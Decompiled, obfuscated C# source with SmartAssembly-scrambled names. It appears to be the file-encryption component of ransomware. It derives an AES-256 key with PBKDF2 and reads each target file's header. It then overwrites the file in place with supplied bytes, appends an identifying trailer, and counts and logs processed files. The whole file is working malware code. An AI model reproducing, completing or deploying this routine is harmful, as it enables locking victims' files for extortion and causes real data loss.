using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class TplgMgKkTztrkdI
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] vtWmNLyRqcLW(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = ugxacFDpQnuetC(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes ugxacFDpQnuetC(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] GDREwDOvqQ(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (XudtxnGtRBJeB.KZdUWCMWRza == getString_0(107396887))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (XudtxnGtRBJeB.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(XudtxnGtRBJeB.ndioqUCcjeEwRygxn, getString_0(107398060) + string_0 + getString_0(107378755) + ex.Message + getString_0(107396654));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool txaKUWpwgCrrkU(string lswqspBeUzjGi, byte[] NviomBsLdCW, byte[] AftuALoSYuJQ = null)
	{
		try
		{
			byte[] array = null;
			if (XudtxnGtRBJeB.KZdUWCMWRza == getString_0(107396887))
			{
				array = (XudtxnGtRBJeB.IflXfWBKZN ? Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697))) : Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(lswqspBeUzjGi, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(NviomBsLdCW, 0, NviomBsLdCW.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(lswqspBeUzjGi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XudtxnGtRBJeB.IflXfWBKZN)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(AftuALoSYuJQ, 0, AftuALoSYuJQ.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (XudtxnGtRBJeB.IflXfWBKZN ? Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697))) : Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706))));
				FileStream fileStream2 = new FileStream(lswqspBeUzjGi, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(NviomBsLdCW, 0, NviomBsLdCW.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(lswqspBeUzjGi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XudtxnGtRBJeB.IflXfWBKZN)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(AftuALoSYuJQ, 0, AftuALoSYuJQ.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			XudtxnGtRBJeB.SYFhGDZRgJn++;
		}
		catch (Exception ex)
		{
			if (XudtxnGtRBJeB.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(XudtxnGtRBJeB.ndioqUCcjeEwRygxn, getString_0(107398060) + lswqspBeUzjGi + getString_0(107378720) + ex.Message + getString_0(107396654));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (XudtxnGtRBJeB.IflXfWBKZN ? Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378697))) : Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(XudtxnGtRBJeB.HEeLoGRVTvMU) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706)) + Convert.ToString(XudtxnGtRBJeB.XLyVBayizjzN) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378706))));
				FileStream fileStream4 = new FileStream(lswqspBeUzjGi, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(NviomBsLdCW, 0, NviomBsLdCW.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(lswqspBeUzjGi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!XudtxnGtRBJeB.IflXfWBKZN)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(AftuALoSYuJQ, 0, AftuALoSYuJQ.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static TplgMgKkTztrkdI()
	{
		Strings.CreateGetStringDelegate(typeof(TplgMgKkTztrkdI));
	}
}
